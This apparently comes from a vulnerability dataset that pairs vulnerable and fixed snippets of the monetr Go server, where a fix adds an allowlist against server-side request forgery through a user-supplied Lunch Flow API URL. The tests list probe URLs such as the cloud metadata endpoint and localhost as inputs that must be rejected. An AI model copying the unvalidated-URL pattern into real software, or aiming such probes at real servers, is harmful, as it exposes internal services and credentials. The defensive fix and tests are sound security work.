+          "text": ")\n\nfunc TestLunchFlow_ValidateConfig(t *testing.T) {\n\tt.Run(\"disabled is a no-op\", func(t *testing.T) {\n\t\tconfiguration := config.LunchFlow{\n\t\t\tEnabled:        false,\n\t\t\tAllowedApiUrls: []string{\"not a valid url\"},\n\t\t}\n\t\tassert.NoError(t, configuration.ValidateConfig())\n\t})\n\n\tt.Run(\"no allowed urls is a no-op\", func(t *testing.T) {\n\t\tconfiguration := config.LunchFlow{\n\t\t\tEnabled: true,\n\t\t}\n\t\tassert.NoError(t, configuration.ValidateConfig())\n\t})\n\n\tt.Run(\"valid urls are accepted\", func(t *testing.T) {\n\t\tconfiguration := config.LunchFlow{\n\t\t\tEnabled: true,\n\t\t\tAllowedApiUrls: []string{\n\t\t\t\t\"https://lunchflow.app/api/v1\",\n\t\t\t\t\"http://lunchflow.app/api/v1\",\n\t\t\t},\n\t\t}\n\t\tassert.NoError(t, configuration.ValidateConfig())\n\t})",
+          "text_sha256": "5dfc83e3b703aed189d684c2ef85bfa884e2e857f0de0f5b34ec2c68d369bf36"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "filename": "server/config/lunch_flow_test.go",
+            "fix_sha": "c260caa3c573a4a396ec2d264c7641a5d958385b",
+            "line_start": 60
+          },
+          "origin": "exact_revision_upstream_test_control",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "fixed_test_control_state",
+          "text": "}\n\nfunc TestLunchFlow_IsAllowedApiUrl(t *testing.T) {\n\tt.Run(\"exact match is allowed\", func(t *testing.T) {\n\t\tconfiguration := config.LunchFlow{\n\t\t\tAllowedApiUrls: []string{\"https://lunchflow.app/api/v1\"},\n\t\t}\n\t\tassert.True(t, configuration.IsAllowedApiUrl(\"https://lunchflow.app/api/v1\"))\n\t})\n\n\tt.Run(\"mismatch is rejected\", func(t *testing.T) {\n\t\tconfiguration := config.LunchFlow{\n\t\t\tAllowedApiUrls: []string{\"https://lunchflow.app/api/v1\"},\n\t\t}\n\t\tassert.False(t, configuration.IsAllowedApiUrl(\"http://169.254.169.254/latest/meta-data\"))\n\t\tassert.False(t, configuration.IsAllowedApiUrl(\"http://127.0.0.1\"))\n\t\tassert.False(t, configuration.IsAllowedApiUrl(\"https://lunchflow.app/api/v2\"))\n\t})\n\n\tt.Run(\"empty list rejects everything\", func(t *testing.T) {\n\t\tconfiguration := config.LunchFlow{}\n\t\tassert.False(t, configuration.IsAllowedApiUrl(\"https://lunchflow.app/api/v1\"))\n\t\tassert.False(t, configuration.IsAllowedApiUrl(\"\"))\n\t})\n\n\tt.Run(\"multiple entries match any of them\", func(t *testing.T) {\n\t\tconfiguration := config.LunchFlow{\n\t\t\tAllowedApiUrls: []string{",
+          "text_sha256": "8e631800332ddfd476292552a13946195761953ed0ff22ee16304d2d1c28958d"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "86ce08e57a378e0151c5b9e77614da062f9de2fc6905fd8da4a9dde519685121",
+            "filename": "server/controller/config.go",
+            "line_end": 16,
+            "line_start": 2,
+            "parent_sha": "195a0c94cad26105dc1e9ee9d5ed902af41ed46c"
+          },
+          "origin": "exact_revision_parent",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "vulnerable_parent_state",
+          "text": "import (\n\t\"net/http\"\n\n\t\"github.com/labstack/echo/v4\"\n\t\"github.com/monetr/monetr/server/build\"\n\t\"github.com/monetr/monetr/server/datasources/lunch_flow\"\n\t\"github.com/monetr/monetr/server/icons\"\n)\n\nfunc (c *Controller) configEndpoint(ctx echo.Context) error {\n\ttype InitialPlan struct {\n\t\tPrice int64 `json:\"price\"`\n\t}\n\tvar configuration struct {",
+          "text_sha256": "892dae6f3bec17ba559990bd28ea165cf92f202eb1abc9914a78f3f2127847a9"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "86ce08e57a378e0151c5b9e77614da062f9de2fc6905fd8da4a9dde519685121",
+            "filename": "server/controller/config.go",
+            "line_end": 100,
+            "line_start": 90,
+            "parent_sha": "195a0c94cad26105dc1e9ee9d5ed902af41ed46c"
+          },
+          "origin": "exact_revision_parent",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [
+              "insecure_http_enabled"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "vulnerable_parent_state",
+          "text": "configuration.IconsEnabled = icons.GetIconsEnabled()\n\tconfiguration.PlaidEnabled = c.Configuration.Plaid.GetEnabled()\n\tconfiguration.ManualEnabled = true\n\tconfiguration.UploadsEnabled = c.Configuration.Storage.Enabled\n\n\tconfiguration.LunchFlowEnabled = c.Configuration.LunchFlow.Enabled\n\tconfiguration.LunchFlowDefaultAPIURL = lunch_flow.DefaultAPIURL\n\n\treturn ctx.JSON(http.StatusOK, configuration)\n}",
+          "text_sha256": "07d6ef48b3bad94032a88f6f60c1077f74ae3488480947b993ba73586d9e4920"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "389cfb8180f386c1a767c248a0a5b2a55ba5f6594007e0ba192ef6669a85e46d",
+            "filename": "server/controller/config.go",
+            "fix_sha": "c260caa3c573a4a396ec2d264c7641a5d958385b",
+            "line_end": 15,
+            "line_start": 2
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "import (\n\t\"net/http\"\n\n\t\"github.com/labstack/echo/v4\"\n\t\"github.com/monetr/monetr/server/build\"\n\t\"github.com/monetr/monetr/server/icons\"\n)\n\nfunc (c *Controller) configEndpoint(ctx echo.Context) error {\n\ttype InitialPlan struct {\n\t\tPrice int64 `json:\"price\"`\n\t}\n\tvar configuration struct {",
+          "text_sha256": "9249c741f5aa0ccc8a4eb836145dcda5692529abe3a06168f59c932221fa5df7"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "389cfb8180f386c1a767c248a0a5b2a55ba5f6594007e0ba192ef6669a85e46d",
+            "filename": "server/controller/config.go",
+            "fix_sha": "c260caa3c573a4a396ec2d264c7641a5d958385b",
+            "line_end": 99,
+            "line_start": 89
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [
+              "insecure_http_enabled"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "configuration.IconsEnabled = icons.GetIconsEnabled()\n\tconfiguration.PlaidEnabled = c.Configuration.Plaid.GetEnabled()\n\tconfiguration.ManualEnabled = true\n\tconfiguration.UploadsEnabled = c.Configuration.Storage.Enabled\n\n\tconfiguration.LunchFlowEnabled = c.Configuration.LunchFlow.IsEnabled()\n\tconfiguration.LunchFlowAllowedAPIURLs = c.Configuration.LunchFlow.AllowedApiUrls\n\n\treturn ctx.JSON(http.StatusOK, configuration)\n}",
+          "text_sha256": "f8124b8a13e128477cf13c4ae9eeb20a7fdffad0d51fea857bc0d62dcfd63165"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "5df13534e0f27d77d1a390e04930aa2ddf87f71d2c73f8815c8031ee94dc801d",
+            "filename": "server/controller/lunch_flow.go",
+            "line_end": 215,
+            "line_start": 202,
+            "parent_sha": "195a0c94cad26105dc1e9ee9d5ed902af41ed46c"
+          },
+          "origin": "exact_revision_parent",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "vulnerable_parent_state",
+          "text": "}\n\n\tclient, err := lunch_flow.NewLunchFlowClient(\n\t\tlog,\n\t\tlink.ApiUrl,\n\t\tsecret.Value,\n\t)\n\tif err != nil {\n\t\treturn c.wrapAndReturnError(\n\t\t\tctx,\n\t\t\terr,\n\t\t\thttp.StatusInternalServerError,\n\t\t\t\"Failed to create Lunch Flow API client\",\n\t\t)",
+          "text_sha256": "eb6bdcba3bc8cee9ab74114759a30d244f4557938025b527398cd156cbee3a62"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "d5de030869259b73a4c4a0453ce57d3fffa97fd0e261fc839336f26fd5c704b5",
+            "filename": "server/controller/lunch_flow.go",
+            "fix_sha": "c260caa3c573a4a396ec2d264c7641a5d958385b",
+            "line_end": 220,
+            "line_start": 206
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "}\n\n\tclient, err := lunch_flow.NewLunchFlowClient(\n\t\tlog,\n\t\tlink.ApiUrl,\n\t\tsecret.Value,\n\t\tc.Configuration.LunchFlow,\n\t)\n\tif err != nil {\n\t\treturn c.wrapAndReturnError(\n\t\t\tctx,\n\t\t\terr,\n\t\t\thttp.StatusInternalServerError,\n\t\t\t\"Failed to create Lunch Flow API client\",\n\t\t)",
+          "text_sha256": "f4678240f977fe43096bd8826e3b9e3ede6fbea2cc8b98b7ebbd93c777ade462"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "02380679b46900c37290fcef1e08aa8fd74e07bc606b8cbf27467b40fad666e7",
+            "filename": "server/controller/lunch_flow_test.go",
+            "line_end": 110,
+            "line_start": 97,
+            "parent_sha": "195a0c94cad26105dc1e9ee9d5ed902af41ed46c"
+          },
+          "origin": "exact_revision_parent",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "vulnerable_parent_state",
+          "text": "response.Status(http.StatusBadRequest)\n\t\tresponse.JSON().Path(\"$.error\").String().IsEqual(\"Invalid request\")\n\t\tresponse.JSON().Path(\"$.problems.lunchFlowURL\").String().IsEqual(\"Lunch Flow API URL must be a full valid URL\")\n\t})\n\n\tt.Run(\"invalid api key\", func(t *testing.T) {\n\t\t_, e := NewTestApplication(t)\n\t\ttoken := GivenIHaveToken(t, e)\n\t\tresponse := e.POST(\"/api/lunch_flow/link\").\n\t\t\tWithCookie(TestCookieName, token).\n\t\t\tWithJSON(map[string]any{\n\t\t\t\t\"name\":         \"US Bank\",\n\t\t\t\t\"lunchFlowURL\": \"https://lunchflow.app/api/v1\",",
+          "text_sha256": "27ccf6d3191ae710d84a13af38da005d311c2ed4a069e1e2f5757dda5c00513f"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "16861a89e38d4fbff68d6558676dc4d8a19d0b8dafe2d237a72269671e030cbc",
+            "filename": "server/controller/lunch_flow_test.go",
+            "fix_sha": "c260caa3c573a4a396ec2d264c7641a5d958385b",
+            "line_end": 154,
+            "line_start": 97
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "response.Status(http.StatusBadRequest)\n\t\tresponse.JSON().Path(\"$.error\").String().IsEqual(\"Invalid request\")\n\t\tresponse.JSON().Path(\"$.problems.lunchFlowURL\").String().IsEqual(\"Lunch Flow API URL must be a full valid URL\")\n\t})\n\n\tt.Run(\"URL not in allowlist\", func(t *testing.T) {\n\t\tfor _, disallowed := range []string{\n\t\t\t\"http://169.254.169.254/latest/meta-data\",\n\t\t\t\"http://127.0.0.1\",\n\t\t\t\"http://localhost\",\n\t\t\t\"https://attacker.example.com/api/v1\",\n\t\t} {\n\t\t\t_, e := NewTestApplication(t)\n\t\t\ttoken := GivenIHaveToken(t, e)\n\t\t\tresponse := e.POST(\"/api/lunch_flow/link\").\n\t\t\t\tWithCookie(TestCookieName, token).\n\t\t\t\tWithJSON(map[string]any{\n\t\t\t\t\t\"name\":         \"Not Allowed\",\n\t\t\t\t\t\"lunchFlowURL\": disallowed,\n\t\t\t\t\t\"apiKey\":       \"foobar\",\n\t\t\t\t}).\n\t\t\t\tExpect()\n\n\t\t\tresponse.Status(http.StatusBadRequest)\n\t\t\tresponse.JSON().Path(\"$.error\").String().IsEqual(\"Invalid request\")\n\t\t\tresponse.JSON().Path(\"$.problems.lunchFlowURL\").String().IsEqual(\"Lunch Flow API URL is not valid or is not in the configured allowlist\")\n\t\t}\n\t})\n\n\tt.Run(\"allowlist with multiple entries accepts any\", func(t *testing.T) {\n\t\tconfig := NewTestApplicationConfig(t)\n\t\tconfig.LunchFlow.AllowedApiUrls = []string{\n\t\t\t\"https://lunchflow.app/api/v1\",\n\t\t\t\"https://lunchflow.compatible.app/api/v1\",\n\t\t}\n\t\t_, e := NewTestApplicationWithConfig(t, config)\n\t\ttoken := GivenIHaveToken(t, e)\n\n\t\tresponse := e.POST(\"/api/lunch_flow/link\").\n\t\t\tWithCookie(TestCookieName, token).\n\t\t\tWithJSON(map[string]any{\n\t\t\t\t\"name\":         \"Staging\",\n\t\t\t\t\"lunchFlowURL\": \"https://lunchflow.compatible.app/api/v1\",\n\t\t\t\t\"apiKey\":       \"foobar\",\n\t\t\t}).\n\t\t\tExpect()\n\t\tresponse.Status(http.StatusOK)\n\t})\n\n\tt.Run(\"invalid api key\", func(t *testing.T) {\n\t\t_, e := NewTestApplication(t)\n\t\ttoken := GivenIHaveToken(t, e)\n\t\tresponse := e.POST(\"/api/lunch_flo",
+          "text_sha256": "fc840907c2aa2df99619393dee7c14565b910b3fe4b3a03e99d03dc761e81933"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "3563d0dd72e40fce39f02ae917e2c72c93c5c3c4f781b10be42b5872fb7dcfa1",
+            "filename": "server/datasources/lunch_flow/client.go",
+            "line_end": 30,
+            "line_start": 8,
+            "parent_sha": "195a0c94cad26105dc1e9ee9d5ed902af41ed46c"
+          },
+          "origin": "exact_revision_parent",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "vulnerable_parent_state",
+          "text": "\"log/slog\"\n\t\"net/http\"\n\t\"net/url\"\n\t\"path\"\n\t\"time\"\n\n\t\"github.com/monetr/monetr/server/crumbs\"\n\t\"github.com/monetr/monetr/server/round\"\n\t\"github.com/pkg/errors\"\n)\n\nconst DefaultAPIURL = \"https://lunchflow.app/api/v1\"\n\nconst DateFormat = \"2006-01-02\"\n\ntype LunchFlowAccountId = json.Number\n\ntype Account struct {\n\tId              LunchFlowAccountId `json:\"id\"`\n\tName            string             `json:\"name\"`\n\tInstitutionName string             `json:\"institution_name\"`\n\tInstitutionLogo *string            `json:\"institution_logo\"`\n\tProvider        string             `json:\"provider\"`",
+          "text_sha256": "d776f387a3b7f2339ea7d89d3b44140b473b8aad34059b0f322f2d219b31677e"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "3563d0dd72e40fce39f02ae917e2c72c93c5c3c4f781b10be42b5872fb7dcfa1",
+            "filename": "server/datasources/lunch_flow/client.go",
+            "line_end": 75,
+            "line_start": 61,
+            "parent_sha": "195a0c94cad26105dc1e9ee9d5ed902af41ed46c"
+          },
+          "origin": "exact_revision_parent",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "vulnerable_parent_state",
+          "text": "}\n\nfunc NewLunchFlowClient(\n\tlog *slog.Logger,\n\tapiUrl string,\n\taccessToken string,\n) (LunchFlowClient, error) {\n\tparsedUrl, err := url.Parse(apiUrl)\n\tif err != nil {\n\t\treturn nil, errors.WithStack(err)\n\t}\n\n\thttpClient := &http.Client{\n\t\tTimeout: 60 * time.Second,\n\t\tTransport: round.NewObservabilityRoundTripper(http.DefaultTransport,",
+          "text_sha256": "71d3b2ced1beaacc56e4e94831339d3a2cc97f97ae4f62fea4dabdf43073f1bf"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "3563d0dd72e40fce39f02ae917e2c72c93c5c3c4f781b10be42b5872fb7dcfa1",
+            "filename": "server/datasources/lunch_flow/client.go",
+            "line_end": 147,
+            "line_start": 128,
+            "parent_sha": "195a0c94cad26105dc1e9ee9d5ed902af41ed46c"
+          },
+          "origin": "exact_revision_parent",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "vulnerable_parent_state",
+          "text": "response, err := l.httpClient.Do(request)\n\tif err != nil {\n\t\treturn errors.Wrap(err, \"failed to send HTTP request\")\n\t}\n\tdefer response.Body.Close()\n\n\tif response.StatusCode != http.StatusOK {\n\t\tbodyStr, _ := io.ReadAll(response.Body)\n\t\treturn errors.Errorf(\"Lunch Flow request failed %s [%d]: %s\", requestUrl, response.StatusCode, string(bodyStr))\n\t}\n\n\tif err := json.NewDecoder(response.Body).Decode(result); err != nil {\n\t\treturn errors.Wrapf(err, \"failed to decode response for request %s [%d]\", requestUrl, response.StatusCode)\n\t}\n\n\treturn nil\n}\n\nfunc (l *lunchFlowClient) GetAccounts(ctx context.Context) ([]Account, error) {\n\tspan := crumbs.StartFnTrace(ctx)",
+          "text_sha256": "a889b7139c1fc9a9869ed89b2725b7574099e4d998d26adae5eeee51e9041e9a"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "825400f8119f04551c296dfc2c50137abafe48dcbaf05bfc9308120d8829e134",
+            "filename": "server/datasources/lunch_flow/client.go",
+            "fix_sha": "c260caa3c573a4a396ec2d264c7641a5d958385b",
+            "line_end": 35,
+            "line_start": 8
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "\"log/slog\"\n\t\"net/http\"\n\t\"net/url\"\n\t\"path\"\n\t\"time\"\n\n\t\"github.com/monetr/monetr/server/config\"\n\t\"github.com/monetr/monetr/server/crumbs\"\n\t\"github.com/monetr/monetr/server/round\"\n\t\"github.com/pkg/errors\"\n)\n\nconst DateFormat = \"2006-01-02\"\n\n// maxResponseBodySize caps how much of an upstream response body we will read.\n// This is defense against a hostile or compromised upstream streaming an\n// unbounded response to exhaust memory. 10mb is generous for realistic account\n// and transaction payloads while bounding worst case allocation.\nconst maxResponseBodySize = 10 * 1024 * 1024\n\ntype LunchFlowAccountId = json.Number\n\ntype Account struct {\n\tId              LunchFlowAccountId `json:\"id\"`\n\tName            string             `json:\"name\"`\n\tInstitutionName string             `json:\"institution_name\"`\n\tInstitutionLogo *string            `json:\"institution_logo\"`\n\tProvider        string             `json:\"provider\"`",
+          "text_sha256": "eb66eb0c8e70c91edb93bc5416d5da044f32152baaa8265536b7e0245373de57"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "825400f8119f04551c296dfc2c50137abafe48dcbaf05bfc9308120d8829e134",
+            "filename": "server/datasources/lunch_flow/client.go",
+            "fix_sha": "c260caa3c573a4a396ec2d264c7641a5d958385b",
+            "line_end": 95,
+            "line_start": 66
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [
+              "insecure_http_enabled"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "}\n\nfunc NewLunchFlowClient(\n\tlog *slog.Logger,\n\tapiUrl string,\n\taccessToken string,\n\tconfiguration config.LunchFlow,\n) (LunchFlowClient, error) {\n\tif !configuration.Enabled {\n\t\tlog.Error(\"lunch flow is not enabled on this server but the client is being instantiated!\",\n\t\t\t\"bug\", true,\n\t\t)\n\t\treturn nil, errors.New(\"Lunch Flow is not enabled on this server\")\n\t}\n\n\tif !configuration.IsAllowedApiUrl(apiUrl) {\n\t\tlog.Warn(\"rejected Lunch Flow API URL that is not in the configured allowlist, please update your configuration if this url is valid!\",\n\t\t\t\"apiUrl\", apiUrl,\n\t\t)\n\t\treturn nil, errors.New(\"Lunch Flow API URL is not in the configured allowlist\")\n\t}\n\n\tparsedUrl, err := url.Parse(apiUrl)\n\tif err != nil {\n\t\treturn nil, errors.WithStack(err)\n\t}\n\n\thttpClient := &http.Client{\n\t\tTimeout: 60 * time.Second,\n\t\tTransport: round.NewObservabilityRoundTripper(http.DefaultTransport,",
+          "text_sha256": "072d28bfeff429acbbd53f896bac159af4183a99f57f1c4c380b354b80ff452a"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "825400f8119f04551c296dfc2c50137abafe48dcbaf05bfc9308120d8829e134",
+            "filename": "server/datasources/lunch_flow/client.go",
+            "fix_sha": "c260caa3c573a4a396ec2d264c7641a5d958385b",
+            "line_end": 168,
+            "line_start": 148
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "response, err := l.httpClient.Do(request)\n\tif err != nil {\n\t\treturn errors.Wrap(err, \"failed to send HTTP request\")\n\t}\n\tdefer response.Body.Close()\n\n\tbody := io.LimitReader(response.Body, maxResponseBodySize)\n\tif response.StatusCode != http.StatusOK {\n\t\tbodyStr, _ := io.ReadAll(body)\n\t\treturn errors.Errorf(\"Lunch Flow request failed %s [%d]: %s\", requestUrl, response.StatusCode, string(bodyStr))\n\t}\n\n\tif err := json.NewDecoder(body).Decode(result); err != nil {\n\t\treturn errors.Wrapf(err, \"failed to decode response for request %s [%d]\", requestUrl, response.StatusCode)\n\t}\n\n\treturn nil\n}\n\nfunc (l *lunchFlowClient) GetAccounts(ctx context.Context) ([]Account, error) {\n\tspan := crumbs.StartFnTrace(ctx)",
+          "text_sha256": "3b1ca2d014f137c5305dc98110e84507d927c58a78a12a3b560ca858fb5be6a2"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "43a15827a87c8dba53014451c7b66164594f9a517d6e4087075811a0fe5ec7cf",
+            "filename": "server/datasources/lunch_flow/client_test.go",
+            "fix_sha": "c260caa3c573a4a396ec2d264c7641a5d958385b",
+            "line_end": 157,
+            "line_start": 90
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [
+              "insecure_http_enabled"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "assert.EqualValues(t, httpmock.GetCallCountInfo(), map[string]int{\n\t\t\t\"GET https://lunchflow.app/api/v1/accounts\": 1,\n\t\t}, \"must match Lunch Flow API calls\")\n\t})\n}\n\nfunc TestLunchFlowClient_Constructor(t *testing.T) {\n\tt.Run(\"rejects URL that is not in the allowlist\", func(t *testing.T) {\n\t\tlog := testutils.GetLog(t)\n\n\t\tclient, err := lunch_flow.NewLunchFlowClient(\n\t\t\tlog,\n\t\t\t\"http://169.254.169.254/latest/meta-data\",\n\t\t\t\"bogus-token\",\n\t\t\tconfig.LunchFlow{\n\t\t\t\tEnabled:        true,\n\t\t\t\tAllowedApiUrls: []string{config.DefaultLunchFlowAPIURL},\n\t\t\t},\n\t\t)\n\t\tassert.EqualError(t, err, \"Lunch Flow API URL is not in the configured allowlist\")\n\t\tassert.Nil(t, client, \"client must be nil on rejection\")\n\t})\n\n\tt.Run(\"rejects when allowlist is empty\", func(t *testing.T) {\n\t\tlog := testutils.GetLog(t)\n\n\t\tclient, err := lunch_flow.NewLunchFlowClient(\n\t\t\tlog,\n\t\t\tconfig.DefaultLunchFlowAPIURL,\n\t\t\t\"bogus-token\",\n\t\t\tconfig.LunchFlow{\n\t\t\t\tEnabled:        true,\n\t\t\t\tAllowedApiUrls: []string{},\n\t\t\t},\n\t\t)\n\t\tassert.EqualError(t, err, \"Lunch Flow API URL is not in the configured allowlist\")\n\t\tassert.Nil(t, client)\n\t})\n\n\tt.Run(\"accepts URL that matches an allowlist entry\", func(t *testing.T) {\n\t\tlog := testutils.GetLog(t)\n\n\t\tclient, err := lunch_flow.NewLunchFlowClient(\n\t\t\tlog,\n\t\t\tconfig.DefaultLunchFlowAPIURL,\n\t\t\t\"bogus-token\",\n\t\t\tconfig.LunchFlow{\n\t\t\t\tEnabled:        true,\n\t\t\t\tAllowedApiUrls: []string{config.DefaultLunchFlowAPIURL},\n\t\t\t},\n\t\t)\n\t\tassert.NoError(t, err, \"must accept an allowlisted URL\")\n\t\tassert.NotNil(t, client, \"client must be created\")\n\t})\n}\n\nfunc TestLunchFlowClient_GetBalance(t *testing.T) {\n\tt.Run(\"happy path read balance\", func(t *testing.T) {\n\t\thttpmock.Activate()\n\t\tdefer httpmock.DeactivateAndReset()\n\n\t\texpectedBalance := lunch_flow.Balance{\n\t\t\tAmount:   \"1234.56\",\n\t\t\tC",
+          "text_sha256": "24a292ac01e14df6c6721091175cbf4764a3df534b5caf9acbda69c8bc4b04d2"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "filename": "server/datasources/lunch_flow/client_test.go",
+            "fix_sha": "c260caa3c573a4a396ec2d264c7641a5d958385b",
+            "line_start": 94
+          },
+          "origin": "exact_revision_upstream_test_control",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [
+              "insecure_http_enabled"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "fixed_test_control_state",
+          "text": "}\n\nfunc TestLunchFlowClient_Constructor(t *testing.T) {\n\tt.Run(\"rejects URL that is not in the allowlist\", func(t *testing.T) {\n\t\tlog := testutils.GetLog(t)\n\n\t\tclient, err := lunch_flow.NewLunchFlowClient(\n\t\t\tlog,\n\t\t\t\"http://169.254.169.254/latest/meta-data\",\n\t\t\t\"bogus-token\",\n\t\t\tconfig.LunchFlow{\n\t\t\t\tEnabled:        true,\n\t\t\t\tAllowedApiUrls: []string{config.DefaultLunchFlowAPIURL},\n\t\t\t},\n\t\t)\n\t\tassert.EqualError(t, err, \"Lunch Flow API URL is not in the configured allowlist\")\n\t\tassert.Nil(t, client, \"client must be nil on rejection\")\n\t})\n\n\tt.Run(\"rejects when allowlist is empty\", func(t *testing.T) {\n\t\tlog := testutils.GetLog(t)\n\n\t\tclient, err := lunch_flow.NewLunchFlowClient(\n\t\t\tlog,\n\t\t\tconfig.DefaultLunchFlowAPIURL,\n\t\t\t\"bogus-token\",\n\t\t\tconfig.LunchFlow{\n\t\t\t\tEnabled:        true,",
+          "text_sha256": "3eaf77f60adb857695e87403e90ce4d14fdb4da955068d45c5951012132d8a60"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "437cdd934815b75b72f8faeca98b7a30d7d95a0f1320193890800882e331617d",
+            "filename": "server/internal/mock_lunch_flow/mock.go",
+            "line_end": 18,
+            "line_start": 4,
+            "parent_sha": "195a0c94cad26105dc1e9ee9d5ed902af41ed46c"
+          },
+          "origin": "exact_revision_parent",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
